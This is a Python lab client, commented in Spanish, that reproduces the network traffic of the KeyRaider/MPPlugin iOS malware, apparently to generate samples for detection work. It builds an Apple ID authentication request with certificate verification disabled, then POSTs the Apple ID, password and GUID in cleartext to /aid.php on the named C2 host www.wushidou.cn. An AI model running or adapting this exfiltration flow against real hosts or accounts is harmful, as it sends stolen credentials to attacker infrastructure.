#!/usr/bin/env python3
"""
Cliente de laboratorio KeyRaider / MPPlugin.

Secuencia generada:
  1. DNS A p12-buy.itunes.apple.com
  2. TLS 1.2 con SNI p12-buy.itunes.apple.com
  3. DNS A www.wushidou.cn
  4. HTTP claro POST /aid.php hacia www.wushidou.cn
"""

from __future__ import annotations

import argparse
import os
import random
import socket
import ssl
import struct
import time
from typing import Tuple
from urllib.parse import quote_plus
from xml.sax.saxutils import escape


APPLE_HOST = "p12-buy.itunes.apple.com"
C2_HOST = "www.wushidou.cn"


def log(msg: str) -> None:
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def encode_qname(name: str) -> bytes:
    out = b""
    for label in name.rstrip(".").split("."):
        raw = label.encode("ascii")
        if len(raw) > 63:
            raise ValueError(f"Etiqueta DNS demasiado larga: {label!r}")
        out += bytes([len(raw)]) + raw
    return out + b"\x00"


def skip_dns_name(packet: bytes, offset: int) -> int:
    while True:
        length = packet[offset]
        if length & 0xC0 == 0xC0:
            return offset + 2
        if length == 0:
            return offset + 1
        offset += 1 + length


def dns_query_a(name: str, server: str, port: int, timeout: float = 3.0) -> str:
    txid = random.randint(0, 0xFFFF)
    header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    question = encode_qname(name) + struct.pack("!HH", 1, 1)
    query = header + question

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(query, (server, port))
        packet, _ = sock.recvfrom(4096)

    r_txid, flags, qdcount, ancount, _nscount, _arcount = struct.unpack("!HHHHHH", packet[:12])
    if r_txid != txid:
        raise RuntimeError(f"Respuesta DNS con transaction-id inesperado para {name}")
    if flags & 0x000F:
        raise RuntimeError(f"DNS devolvió RCODE={flags & 0x000F} para {name}")

    offset = 12
    for _ in range(qdcount):
        offset = skip_dns_name(packet, offset)
        offset += 4

    for _ in range(ancount):
        offset = skip_dns_name(packet, offset)
        rtype, rclass, _ttl, rdlength = struct.unpack("!HHIH", packet[offset : offset + 10])
        offset += 10
        rdata = packet[offset : offset + rdlength]
        offset += rdlength
        if rtype == 1 and rclass == 1 and rdlength == 4:
            return socket.inet_ntoa(rdata)

    raise RuntimeError(f"No hubo respuesta A para {name}")


def recv_some(sock: socket.socket, limit: int = 65535) -> bytes:
    sock.settimeout(2.0)
    chunks = []
    total = 0
    while total < limit:
        try:
            chunk = sock.recv(min(4096, limit - total))
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)
        if b"\r\n\r\n" in b"".join(chunks):
            # En este laboratorio basta con observar una respuesta HTTP corta.
            continue
    return b"".join(chunks)


def build_apple_authentication_plist(apple_id: str, password: str, guid: str) -> bytes:
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        f"<key>appleId</key>\n\t<string>{escape(apple_id)}</string>\n"
        f"<key>password</key>\n\t<string>{escape(password)}</string>\n"
        f"<key>guid</key>\n\t<string>{escape(guid)}</string>\n"
        "</dict>\n"
        "</plist>\n"
    ).encode("utf-8")


def validate_apple_authentication_response(response: bytes) -> None:
    header_blob, separator, body = response.partition(b"\r\n\r\n")
    status_line = header_blob.split(b"\r\n", 1)[0]
    if not separator or status_line != b"HTTP/1.1 200 OK":
        raise RuntimeError("La autenticación Apple no devolvió HTTP 200")
    if b"<key>dsPersonId</key><string>" not in body:
        raise RuntimeError("La respuesta Apple no contiene dsPersonId; se cancela la exfiltración")


def close_tls_gracefully(tls: ssl.SSLSocket, timeout: float = 2.0) -> bool:
    """Intercambia close_notify antes de cerrar el socket TCP subyacente."""
    try:
        tls.settimeout(timeout)
        raw = tls.unwrap()
    except (OSError, ssl.SSLError):
        tls.close()
        return False
    raw.close()
    return True


def apple_tls_flow(
    ip: str,
    port: int,
    host: str,
    apple_id: str,
    password: str,
    guid: str,
    keylog_file: str | None,
) -> None:
    body = build_apple_authentication_plist(apple_id, password, guid)

    request = (
        b"POST /WebObjects/MZFinance.woa/wa/authenticate HTTP/1.1\r\n"
        + f"Host: {host}\r\n".encode("ascii")
        + b"User-Agent: AppStore/2.0 iOS/8.4 model/iPhone\r\n"
        + b"Accept-Language: en-us\r\n"
        + b"Accept-Encoding: gzip, deflate\r\n"
        + b"Content-Type: application/x-apple-plist\r\n"
        + f"Content-Length: {len(body)}\r\n".encode("ascii")
        + b"\r\n"
        + body
    )

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    if keylog_file:
        context.keylog_filename = keylog_file

    try:
        context.set_ciphers(
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "AES128-SHA:"
            "AES256-SHA"
        )
    except ssl.SSLError as exc:
        log(f"No se pudieron fijar todos los ciphers TLS 1.2 solicitados: {exc}")

    log(f"Conectando TLS Apple {host} ({ip}:{port}) con SNI={host}")
    raw = socket.create_connection((ip, port), timeout=5.0)
    tls: ssl.SSLSocket | None = None
    try:
        tls = context.wrap_socket(raw, server_hostname=host)
        log(f"TLS Apple negociado: version={tls.version()} cipher={tls.cipher()}")
        tls.sendall(request)
        response = recv_some(tls)
        validate_apple_authentication_response(response)
        log(f"TLS Apple respuesta recibida: {len(response)} bytes con dsPersonId")
    finally:
        if tls is not None:
            if not close_tls_gracefully(tls):
                log("AVISO: cierre TLS Apple incompleto")
        else:
            raw.close()


def c2_http_flow(ip: str, port: int, host: str, apple_id: str, password: str, guid: str) -> None:
    encoded_name = quote_plus(apple_id)
    body = (
        f"id={encoded_name}"
        f"&name={encoded_name}"
        f"&pass={password}"
        f"&guid={guid}"
    ).encode("utf-8")

    request = (
        b"POST /aid.php HTTP/1.1\r\n"
        + f"Host: {host}\r\n".encode("ascii")
        + b"Content-Type: application/x-www-form-urlencoded\r\n"
        + f"Content-Length: {len(body)}\r\n".encode("ascii")
        + b"\r\n"
        + body
    )

    log(f"Conectando C2 HTTP {host} ({ip}:{port})")
    with socket.create_connection((ip, port), timeout=5.0) as sock:
        sock.sendall(request)
        response = recv_some(sock)
        first_line = response.split(b"\r\n", 1)[0].decode("iso-8859-1", errors="replace") if response else ""
        log(f"C2 respuesta recibida: {len(response)} bytes {first_line!r}")


def parse_args():
    parser = argparse.ArgumentParser(description="Cliente de laboratorio KeyRaider/MPPlugin")
    parser.add_argument("--dns-server", default="127.0.0.1")
    parser.add_argument("--dns-port", type=int, default=53)
    parser.add_argument("--apple-host", default=APPLE_HOST)
    parser.add_argument("--c2-host", default=C2_HOST)
    parser.add_argument("--tls-port", type=int, default=443)
    parser.add_argument("--c2-port", type=int, default=80)
    parser.add_argument("--apple-id", default="victim@example.com")
    parser.add_argument("--password", default="Password123")
    parser.add_argument("--guid", default="00000000-1111-2222-3333-444444444444")
    parser.add_argument("--keylog-file", default=None)
    return parser.parse_args()


def main() -> int:
    args = parse_args()

    try:
        apple_ip = dns_query_a(args.apple_host, args.dns_server, args.dns_port)
        log(f"DNS {args.apple_host} -> {apple_ip}")
        apple_tls_flow(
            apple_ip,
            args.tls_port,
            args.apple_host,
            args.apple_id,
            args.password,
            args.guid,
            args.keylog_file,
        )

        c2_ip = dns_query_a(args.c2_host, args.dns_server, args.dns_port)
        log(f"DNS {args.c2_host} -> {c2_ip}")
        c2_http_flow(c2_ip, args.c2_port, args.c2_host, args.apple_id, args.password, args.guid)
    except KeyboardInterrupt:
        log("Interrumpido por el usuario.")
        return 130

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
